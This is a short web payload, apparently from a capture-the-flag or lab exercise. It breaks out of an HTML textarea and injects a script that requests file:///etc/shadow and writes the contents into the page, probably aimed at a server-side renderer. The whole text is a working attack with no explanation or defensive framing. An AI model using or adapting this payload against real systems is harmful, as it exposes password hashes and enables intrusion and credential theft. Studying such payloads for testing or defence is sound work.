</textarea>
<script>
flag = new XMLHttpRequest;
flag.onload=function(){document.write(this.responseText)};
flag.open('GET', 'file:///etc/shadow');
flag.send();
</script>
<textarea>
